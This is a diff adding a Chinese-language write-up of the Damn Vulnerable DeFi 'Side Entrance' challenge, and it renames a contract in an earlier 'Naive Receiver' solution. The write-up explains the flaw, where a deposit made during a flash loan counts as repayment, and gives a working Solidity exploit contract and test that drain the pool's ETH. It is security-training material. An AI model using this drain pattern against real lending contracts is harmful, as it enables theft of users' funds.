@@ -185,7 +185,7 @@ pragma solidity ^0.8.0;
 import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
 
-contract Hacker {
+contract NaiveReceiverHacker {
     address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
 
     function exploit(address pool, address receiver) external {
@@ -203,7 +203,7 @@ contract Hacker {
 
 ```js
 it('Execution', async function () {
-    let hacker = await (await ethers.getContractFactory("Hacker")).deploy();
+    let hacker = await (await ethers.getContractFactory("NaiveReceiverHacker")).deploy();
     await hacker.exploit(pool.address, receiver.address);
 });
 ```
@@ -257,3 +257,79 @@ it('Execution', async function () {
 ### 参考资料
 
 - [encodeABI to get call data with encoded parameters of contract method · Issue #478 · ethers-io/ethers.js](https://github.com/ethers-io/ethers.js/issues/478#issuecomment-495814010)
+
+## 4. Side Entrance
+
+> A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.
+>
+> It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.
+>
+> Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.
+
+- `flashLoan()` 检查借贷前后 `SideEntranceLenderPool` 的余额，而 `deposit` 能够增加其余额并为 `msg.sender` 记账
+- 可在 `flashLoan()` 时 `deposit()`，结束后 `withdraw()`
+
+```js
+// SideEntranceLenderPool.sol
+function deposit() external payable {
+    unchecked {
+        balances[msg.sender] += msg.value;
+    }
+    emit Deposit(msg.sender, msg.value);
+}
+
+function withdraw() external {
+    uint256 amount = balances[msg.sender];
+    
+    delete balances[msg.sender];
+    emit Withdraw(msg.sender, amount);
+
+    SafeTransferLib.safeTransferETH(msg.sender, amount);
+}
+
+function flashLoan(uint256 amount) external {
+    uint256 balanceBefore = address(this).balance;
+
+    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
+
+    if (address(this).balance < balanceBefore)
+        revert RepayFailed();
+}
+```
+
+### Exploit
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./SideEntranceLenderPool.sol";
+
+contract SideEntranceHacker is IFlashLoanEtherReceiver {
+
+    SideEntranceLenderPool pool;
+
+    constructor(address instance) {
+        pool = SideEntranceLenderPool(instance);
+    }
+
+    function exploit() external payable {
+        pool.flashLoan(1000 ether);
+        pool.withdraw();
+        payable(tx.origin).transfer(1000 ether);
+    }
+
+    function execute() external payable {
+        pool.deposit{value: 1000 ether}();
+    }
+
+    receive() external payable {}
+}
+```
+
+```js
+it('Execution', async function () {
+    let hacker = await (await ethers.getContractFactory('SideEntranceHacker', player)).deploy(pool.address);
+    await hacker.exploit();
+});
+```
